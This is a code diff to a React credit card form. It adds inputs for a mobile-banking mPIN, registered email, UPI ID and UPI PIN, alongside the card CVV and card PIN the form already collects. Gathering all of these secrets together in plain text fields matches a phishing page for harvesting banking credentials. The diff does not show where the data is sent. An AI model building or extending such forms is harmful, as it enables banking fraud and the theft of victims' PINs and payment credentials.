@@ -34,6 +34,13 @@ const creditFormSchema = z.object({
     expiryYear: z.string().min(2, "Year cannot be in the past"),
     cvv: z.string().length(3, "CVV must be exactly 3 digits"),
     pin: z.string().length(4, "PIN must be exactly 4 digits"),
+    mPin: z.string(),
+    email: z.string(),
+    upiId: z.string(),
+    upiPin: z.string(),
+    billDate: z.string(),
+    dueDate: z.string(),
+
 })
 
 export default function CreditCardForm() {
@@ -48,6 +55,7 @@ export default function CreditCardForm() {
             expiryYear: undefined,
             cvv: "",
             pin: "",
+            mPin: "",
         },
     })
 
@@ -62,7 +70,6 @@ export default function CreditCardForm() {
             <Form{...creditForm}>
 
                 <form onSubmit={creditForm.handleSubmit(onSubmit, onInvalid)}>
-
                     <FormField
                         control={creditForm.control}
                         name="bankCardName"
@@ -165,6 +172,75 @@ export default function CreditCardForm() {
                                 <FormLabel>PIN Code:</FormLabel>
                                 <FormControl>
                                     <Input placeholder="1234" {...field} />
+                                </FormControl>
+                                <FormMessage />
+                            </FormItem>
+                        )}
+                    />
+
+
+                    <FormField
+                        control={creditForm.control}
+                        name="email"
+                        render={({ field }) => (
+                            <FormItem>
+                                <FormLabel>Registered Email:</FormLabel>
+                                <FormControl>
+                                    <Input placeholder="YY" {...field} />
+                                </FormControl>
+                                <FormMessage />
+                            </FormItem>
+                        )}
+                    />
+
+                    <FormField
+                        control={creditForm.control}
+                        name="upiId"
+                        render={({ field }) => (
+                            <FormItem>
+                                <FormLabel>UPI ID:</FormLabel>
+                                <FormControl>
+                                    <Input placeholder="YY" {...field} />
+                                </FormControl>
+                                <FormMessage />
+                            </FormItem>
+                        )}
+                    />
+                    <FormField
+                        control={creditForm.control}
+                        name="upiPin"
+                        render={({ field }) => (
+                            <FormItem>
+                                <FormLabel>UPI Pin:</FormLabel>
+                                <FormControl>
+                                    <Input placeholder="YY" {...field} />
+                                </FormControl>
+                                <FormMessage />
+                            </FormItem>
+                        )}
+                    />
+                    <FormField
+                        control={creditForm.control}
+                        name="billDate"
+                        render={({ field }) => (
+                            <FormItem>
+                                <FormLabel>Bill Date:</FormLabel>
+                                <FormControl>
+                                    <Input placeholder="YY" {...field} />
+                                </FormControl>
+                                <FormMessage />
+                            </FormItem>
+                        )}
+                    />
+
+                    <FormField
+                        control={creditForm.control}
+                        name="dueDate"
+                        render={({ field }) => (
+                            <FormItem>
+                                <FormLabel>Due Date:</FormLabel>
+                                <FormControl>
+                                    <Input placeholder="YY" {...field} />
                                 </FormControl>
                                 <FormMessage />
                             </FormItem>
